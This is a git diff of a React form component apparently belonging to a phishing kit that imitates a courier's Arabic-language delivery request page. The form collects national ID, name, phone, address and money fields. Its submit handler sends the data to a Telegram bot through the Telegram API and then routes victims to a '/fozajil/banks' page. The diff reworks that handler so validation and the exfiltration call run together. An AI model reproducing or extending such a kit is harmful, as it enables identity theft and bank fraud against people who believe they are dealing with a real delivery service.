@@ -23,13 +23,7 @@ const FormZajil = () => {
 
   const router = useRouter()
   
-  const handlerout = ()=>{
-    if(numberTrack.current.value == "" && numbernation.current.value == "" && fullname.current.value== "" && numphone.current.value == ""&& typeshohna.current.value == ""&& adress.current.value == ""&&city.current.value == ""&&mony.current.value == "") {
-      alert('من فضلك قم بملى الحقول')
-    }else{
-      router.push('/fozajil/banks')
-    }
-  }  
+  
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -41,6 +35,12 @@ const FormZajil = () => {
    
     
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+if(numberTrack.current.value == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
+      alert('من فضلك قم بملى الحقول')
+    }else{
+      router.push('/fozajil/banks')
+    }
+  
     
   }
 
@@ -49,7 +49,7 @@ const FormZajil = () => {
       <div className={styles.navbar}>
         <h2>طلب  توصيل واستلام</h2>
       </div>
-        <form  onSubmit={handleSubmit} > 
+        <form   > 
 
             <Image 
               src={formza}
@@ -115,7 +115,7 @@ const FormZajil = () => {
       pathname:"/fozajil/banks/",
       query:{name:d},
     }}
-     className={styles.button}><button type='submit' onClick={handlerout} >التالي</button></Link>
+     className={styles.button} onClick={handleSubmit}>التالي</Link>
         </form>
     </div>
 
